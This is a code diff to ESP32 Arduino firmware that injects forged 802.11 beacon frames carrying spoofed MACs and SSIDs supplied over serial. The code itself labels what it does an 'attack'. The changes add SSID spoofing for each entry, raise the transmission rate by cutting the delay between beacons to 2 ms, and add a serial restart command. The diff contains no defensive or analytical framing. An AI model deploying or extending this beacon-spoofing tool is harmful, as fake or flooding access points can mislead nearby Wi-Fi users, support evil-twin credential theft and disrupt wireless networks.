@@ -14,10 +14,9 @@ uint8_t mac[6];
 uint8_t channel = 1;
 uint32_t packetSize = 0;
 uint32_t packetCount = 0;
-uint32_t currentTime = 0;
-uint32_t attackTime = 0;
 String macs[30];
 int txs[30];
+String ssids[30];
 int i = 0;
 
 // beacon frame definition
@@ -102,9 +101,15 @@ void setup(){
         input = input.substring(input.indexOf(";") + 1);
 
         //get tx
-        txs[i] = input.substring(0, input.indexOf(",")).toInt();
+        txs[i] = input.substring(0, input.indexOf(";")).toInt();
         Serial.println(txs[i]);
+        input = input.substring(input.indexOf(";") + 1);
+
+        //get ssid
+        ssids[i] = input.substring(0, input.indexOf(","));
+        Serial.println(ssids[i]);
         input = input.substring(input.indexOf(",") + 1);
+
         //increment i
         i++;
     }
@@ -117,7 +122,6 @@ void setup(){
 }
 
 void loop(){
-    currentTime = millis();
     for(int j=0; j<i; j++){
         //best effort basis for now
         // nextChannel();
@@ -135,29 +139,31 @@ void loop(){
         memcpy(&beaconPacket[38], emptySSID, ssid_len);
 
         //change ssid to macs[j]
-        const char* tmp = macs[j].c_str();
+        const char* tmp = ssids[j].c_str();
         memcpy(&beaconPacket[38], tmp, strlen(tmp));
 
         //change channel
         beaconPacket[82] = channel;
 
-        //send beacon 3 times
-        for(int cnt = 0; cnt < 3; cnt++){
-            //send beacon
-            ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false));
-            //increment packet count
-            packetCount++;
-            vTaskDelay(30 / portTICK_PERIOD_MS);
-        }
-        
-        //measure attack time
+        //send beacon
+        ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false));
+        //increment packet count
+        packetCount++;
+        vTaskDelay(2 / portTICK_PERIOD_MS);
         
     }
-    attackTime = millis();
-    Serial.print("Attack complete. Time taken:");
-    Serial.println(attackTime - currentTime);
+    Serial.print("Attack complete.");
     Serial.print("Packets sent: ");
     Serial.println(packetCount);
+    if(Serial.available()){
+        byte input = Serial.read();
+        if(input==0x00){
+            Serial.println("Restarting...");
+            ESP.restart();}
+        else {
+            Serial.println("Invalid input");
+        }
+    }
 }
 
 void nextChannel(){
